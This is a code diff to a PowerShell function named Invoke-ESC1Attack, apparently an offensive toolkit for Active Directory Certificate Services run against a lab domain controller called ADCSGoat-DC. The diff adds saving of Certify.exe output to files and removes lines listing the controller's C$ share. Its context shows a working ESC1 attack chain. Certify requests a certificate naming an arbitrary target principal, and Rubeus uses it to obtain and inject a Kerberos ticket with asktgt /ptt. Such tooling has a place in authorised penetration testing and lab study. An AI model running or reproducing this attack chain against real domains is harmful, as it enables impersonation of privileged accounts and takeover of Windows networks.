@@ -106,7 +106,7 @@ function Invoke-ESC1Attack {
         [string]$RubeusPath = ".\Binaries\Rubeus.exe",
         
         [Parameter()]
-        [string]$OutputPath = ".",
+        [string]$OutputPath = "./Output/",
         
         [Parameter()]
         [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
@@ -419,8 +419,22 @@ function Invoke-ESC1Attack {
                 Write-Warning "Executing ESC1 attack against template '$templateName'"
                 Write-Warning "Requesting certificate with target principal SAN: $targetName ($targetSID)"
                 
+                # Create Certify output filename
+                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+                $certifyOutputFileName = "Certify_$($templateName)_$($targetName)_$timestamp.txt"
+                $certifyOutputFilePath = Join-Path $OutputPath $certifyOutputFileName
+                
                 $certifyOutput = & $CertifyPath $certifyArgs 2>&1
                 $exitCode = $LASTEXITCODE
+                
+                # Save Certify output to file
+                try {
+                    $certifyOutput | Out-File -FilePath $certifyOutputFilePath -Encoding UTF8
+                    Write-Verbose "Certify output saved to: $certifyOutputFilePath"
+                    Write-Host "[i] Certify output saved to: $certifyOutputFilePath" -ForegroundColor Cyan
+                } catch {
+                    Write-Warning "Failed to save Certify output to file: $($_.Exception.Message)"
+                }
                 
                 Write-Verbose "Certify.exe exit code: $exitCode"
                 Write-Verbose "Certify.exe output: $($certifyOutput -join "`n")"
@@ -480,7 +494,6 @@ function Invoke-ESC1Attack {
                             # Execute Rubeus
                             $rubeusOutput = & $RubeusPath $rubeusArgs 2>&1
                             $rubeusOutput += klist
-                            $rubeusOutput += Get-ChildItem \\ADCSGoat-DC\C$
                             $rubeusExitCode = $LASTEXITCODE
                             
                             Write-Verbose "Rubeus.exe exit code: $rubeusExitCode"
@@ -496,10 +509,6 @@ function Invoke-ESC1Attack {
                                 } else {
                                     Write-Warning "Kirbi file was not created at expected location: $kirbiFilePath"
                                 }
-                                
-                                # Write-Host "[!] New user context: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Yellow
-                                Write-Host (Get-ChildItem \\ADCSGoat-DC\C$)
-                                klist
                                 
                             } else {
                                 Write-Warning "Rubeus failed with exit code $rubeusExitCode"
@@ -520,6 +529,7 @@ function Invoke-ESC1Attack {
                         TargetSID = $targetSID
                         CertificateAuthority = $CertificateAuthority
                         CertifyOutput = $certifyOutput -join "`n"
+                        CertifyOutputFile = $certifyOutputFilePath
                         RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                         RubeusExitCode = $rubeusExitCode
                         KirbiFile = $kirbiFile
@@ -567,6 +577,7 @@ function Invoke-ESC1Attack {
                     Error = $_.Exception.Message
                     Certificate = $null
                     CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
+                    CertifyOutputFile = if ($certifyOutputFilePath -and (Test-Path $certifyOutputFilePath)) { $certifyOutputFilePath } else { $null }
                     RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                     RubeusExitCode = $rubeusExitCode
                     KirbiFile = if ($kirbiFile) { $kirbiFile } else { $null }
@@ -579,11 +590,14 @@ function Invoke-ESC1Attack {
             $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
             $kirbiFileName = "$($targetName)_$timestamp.kirbi"
             $kirbiFilePath = Join-Path $OutputPath $kirbiFileName
+            $certifyOutputFileName = "Certify_$($templateName)_$($targetName)_$timestamp.txt"
+            $certifyOutputFilePath = Join-Path $OutputPath $certifyOutputFileName
             
             Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
             Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
             Write-Host "What if: Would extract certificate from Certify output" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
+            Write-Host "What if: Would save Certify output to: $certifyOutputFilePath" -ForegroundColor Yellow
             Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
             Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /outfile:$kirbiFilePath /ptt" -ForegroundColor Yellow
             Write-Host "What if: Would save kirbi file to: $kirbiFilePath" -ForegroundColor Yellow
@@ -596,6 +610,7 @@ function Invoke-ESC1Attack {
                 TargetSID = $targetSID
                 CertificateAuthority = $CertificateAuthority
                 CertifyOutput = "WhatIf mode - attack not executed"
+                CertifyOutputFile = $null
                 RubeusOutput = "WhatIf mode - Rubeus not executed"
                 RubeusExitCode = 0
                 KirbiFile = $null
